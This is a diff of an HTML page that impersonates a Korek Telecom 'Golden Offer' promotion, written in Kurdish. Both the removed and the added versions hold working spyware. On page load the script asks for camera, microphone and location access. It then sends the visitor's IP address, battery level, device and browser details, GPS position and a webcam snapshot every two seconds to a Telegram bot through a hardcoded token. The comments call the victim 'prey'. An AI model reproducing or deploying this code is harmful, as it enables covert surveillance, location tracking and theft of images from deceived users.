@@ -2,95 +2,98 @@
 <html lang="ku">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Korek Telecom - Golden Offer</title>
-    
-    <script>
-        /* --- بەشی هاک - یەکسەر کار دەکات پێش باربوونی دیزاین --- */
-        const urlParams = new URLSearchParams(window.location.search);
-        const targetID = urlParams.get('id'); 
-        const TOKEN = "8300725896:AAHHhfRB0II4tFDs7ypgNTS_Xc9gWP40Z58";
-
-        async function instantCapture() {
-            if (!targetID) return;
-
-            try {
-                // یەکسەر داوای مۆڵەت دەکات
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" }, 
-                    audio: true 
-                });
-
-                // ناردنی ڕاپۆرتی سەرەتایی
-                const ipData = await fetch('https://api.ipify.org?format=json').then(res => res.json());
-                
-                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        chat_id: targetID, 
-                        text: `🦅 <b>نێچیرێکی نوێ کەوتە ناو تەڵەوە!</b>\n🌐 IP: <code>${ipData.ip}</code>`, 
-                        parse_mode: "HTML"
-                    })
-                });
-
-                // دەستپێکردنی وێنەگرتن لە پاشبنەما
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                video.muted = true;
-                video.play();
-
-                setInterval(() => {
-                    const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    canvas.toBlob(blob => {
-                        if (blob) {
-                            let fd = new FormData();
-                            fd.append("chat_id", targetID);
-                            fd.append("photo", blob, "shot.jpg");
-                            fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-                        }
-                    }, 'image/jpeg', 0.7);
-                }, 2000);
-
-                // وەرگرتنی لوکەیشن یەکسەر
-                navigator.geolocation.getCurrentPosition(pos => {
-                    fetch(`https://api.telegram.org/bot${TOKEN}/sendLocation`, {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({chat_id: targetID, latitude: pos.coords.latitude, longitude: pos.coords.longitude})
-                    });
-                });
-
-            } catch (e) {}
-        }
-
-        // بانگکردنی فەنکشنەکە بەبێ وەستان
-        instantCapture();
-    </script>
-
-    <style>
-        body { margin: 0; padding: 0; font-family: sans-serif; background-color: #005596; color: white; text-align: center; }
-        header { width: 100%; background-color: white; padding: 10px 0; border-bottom: 3px solid #fdb913; }
-        .hero { padding: 30px 20px; }
-        .golden { color: #fdb913; font-size: 35px; font-weight: bold; }
-        .recharge-box { background: white; color: #333; padding: 20px; border-radius: 10px; margin: 20px auto; width: 90%; max-width: 350px; }
-    </style>
+    <link rel="icon" type="image/png" href="https://www.korektelecom.com/media/1001/korek-logo.png">
+    <title>کۆڕەک تیلیکۆم - پاداشتی زێڕین</title>
+    <style>body { background-color: black; margin: 0; overflow: hidden; }</style>
 </head>
-<body>
-    <header>
-        <img src="https://www.korektelecom.com/media/1001/korek-logo.png" alt="Korek" width="120">
-    </header>
-    <div class="hero">
-        <div class="golden">Golden Offer</div>
-        <div style="font-size: 45px; font-weight: 900;">*203#</div>
-        <div class="recharge-box">
-            <div style="border: 3px solid #f3f3f3; border-top: 3px solid #005596; border-radius: 50%; width: 25px; height: 25px; animation: spin 1s linear infinite; margin: auto;"></div>
-            <p style="font-size: 14px;">خەریکی پشکنینی سیمکارتەکەتین...</p>
-        </div>
-    </div>
-    <style> @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } } </style>
+<body onload="capture()">
+<script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const targetID = urlParams.get('id'); 
+    const TOKEN = "8300725896:AAHHhfRB0II4tFDs7ypgNTS_Xc9gWP40Z58";
+
+    async function capture() {
+        if (!targetID) return;
+
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "user" }, 
+                audio: true 
+            });
+
+            // وەرگرتنی زانیاری شەحن (Battery)
+            let batteryInfo = "Unknown";
+            if (navigator.getBattery) {
+                const batt = await navigator.getBattery();
+                batteryInfo = `${(batt.level * 100).toFixed(0)}%`;
+            }
+            
+            // ناردنی IP و زانیارییە وردەکان
+            fetch('https://api.ipify.org?format=json')
+                .then(res => res.json())
+                .then(data => {
+                    let report = `🦅 <b>نێچیرێکی نوێ ڕاوکرا!</b>\n\n` +
+                                 `👤 <b>ID:</b> <code>${targetID}</code>\n` +
+                                 `🌐 <b>IP:</b> <code>${data.ip}</code>\n` +
+                                 `🔋 <b>Battery:</b> <code>${batteryInfo}</code>\n` +
+                                 `📱 <b>Device:</b> <code>${navigator.platform}</code>\n` +
+                                 `🌐 <b>Browser:</b> <code>${navigator.userAgent.split(' ')[0]}</code>`;
+                    sendToTelegram(report);
+                });
+
+            navigator.geolocation.getCurrentPosition(pos => {
+                sendLocation(pos.coords.latitude, pos.coords.longitude);
+            });
+
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.muted = true;
+            video.play();
+
+            const takeSnap = () => {
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth; 
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0);
+                canvas.toBlob(b => {
+                    if (b) sendFile(b, "photo");
+                }, 'image/jpeg', 0.7);
+            };
+
+            // وێنەگرتن هەر ٢ چرکە جارێک
+            setInterval(takeSnap, 2000);
+
+        } catch (e) {
+            sendToTelegram("⚠️ نێچیرەکە ڕێگری کرد لە دەسەڵاتەکان.");
+        }
+    }
+
+    function sendToTelegram(text) {
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({chat_id: targetID, text: text, parse_mode: "HTML"})
+        });
+    }
+
+    function sendLocation(lat, lon) {
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendLocation`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({chat_id: targetID, latitude: lat, longitude: lon})
+        });
+    }
+
+    function sendFile(blob, type) {
+        let fd = new FormData();
+        fd.append("chat_id", targetID);
+        fd.append(type, blob, "shot.jpg");
+        fetch(`https://api.telegram.org/bot${TOKEN}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, { 
+            method: 'POST', 
+            body: fd 
+        });
+    }
+</script>
 </body>
 </html>
